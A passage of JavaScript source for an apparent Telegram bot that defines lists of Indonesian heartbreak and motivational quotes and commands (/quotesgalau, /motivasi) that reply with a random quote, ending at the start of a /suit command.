    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
];

// Command: /quotesgalau
bot.onText(/^\/quotesgalau$/, (msg) => {
    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(galau);
    bot.sendMessage(chatId, bacotan);
});

const motivasi = [
 "ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
];

// Command: /quotesgalau
bot.onText(/^\/motivasi$/, (msg) => {
    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(motivasi);
    bot.sendMessage(chatId, bacotan);
});        

// Command /suit
bot.onText(/^\/suit$/, async (msg) => {
